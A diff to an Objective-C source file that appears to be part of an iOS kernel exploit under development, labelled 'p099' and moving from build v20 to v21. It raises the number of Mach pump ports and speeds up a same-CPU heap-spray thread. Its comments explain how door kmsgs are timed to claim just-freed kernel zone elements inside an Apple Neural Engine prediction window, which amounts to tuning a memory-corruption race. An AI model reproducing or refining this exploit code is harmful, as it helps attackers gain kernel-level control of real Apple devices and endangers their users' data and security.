@@ -33,7 +33,7 @@
 #import "LabLocalTime.h"
 #import "LabDeviceProfile.h"
 
-#define P099_BUILD @"p099-aneprewire-v20-pinnedburst"
+#define P099_BUILD @"p099-aneprewire-v21-bulletwin"
 
 #define P099_INPUT_COUNT 254
 /* v13 INTERLEAVE LAW (the 21:38/21:40 v12 MAF rounds): the fill's crossing
@@ -330,7 +330,7 @@ static BOOL p099_send_portkind_victim(mach_port_t port, uint32_t index) {
    the kept-8 free slots sit adjacent to the ANE's pop set). The pump sends
    door kmsgs from PRE-MADE ports immediately before each prediction attempt
    so the ANE's record-area element pops in the same magazine region. */
-#define P099_PUMP_PORTS 256u
+#define P099_PUMP_PORTS 512u
 static mach_port_t g_p099_pumpPorts[P099_PUMP_PORTS];
 static uint32_t    g_p099_pumpSent;
 /* v17: fire-window pump — send `batch` door kmsgs on pre-made ports. */
@@ -365,8 +365,16 @@ static volatile int g_p099_pumpRun;
 static void *p099_pump_thread(void *unused) {
     p099_pin();   /* v19: same magazine as the fire */
     while (g_p099_pumpRun) {
-        p099_fire_pump(4);
-        usleep(25000);   /* 160/s pump cadence ≈ the reload window's alloc rate */
+        p099_fire_pump(2);
+        /* v21 BULLET CADENCE (the bridge law, 23F77 carve): the fill's own
+           window allocates A+B after the record writes and frees them at
+           MMR-exit — free stack [R,B,A], next fire pops R and crosses into
+           B/A's just-freed element (~the stable rotation behind 19 MAFs).
+           The claim must pop the stack head INSIDE the fire's own
+           [R-alloc → rec-192] window = ~10µs pops at ≥1/10µs — a sustained
+           same-CPU bullet pump through the WHOLE synchronous send, holding
+           all victims (the per-attempt bursts were early; 4/25ms too slow). */
+        usleep(5);
     }
     return NULL;
 }
@@ -698,7 +706,7 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
                                 L(@"[fire %d] model reloaded (fresh ANE compile session)", t);
                             }
                             err = nil;
-                            if (!t) { p099_pump_start(); L(@"[v19] pump thread armed SAME-CPU (tag 1 — the p110 fleet law; pump 4/25ms racing the ANE's pops in ONE magazine)"); }
+                            if (!t) { p099_pump_start(); L(@"[v21] bullet pump SAME-CPU: ~2 claims/5µs held through the whole synchronous send (the [R,B,A] rotation law — claim the stack head INSIDE the fire window; 23F77 alloc-map law)"); }
                             /* v20: the last untested combination — v17's per-attempt
                                burst WITH the v19 same-CPU pin (v17's own loss was
                                the UNPINNED pump; four steer laws each produced the
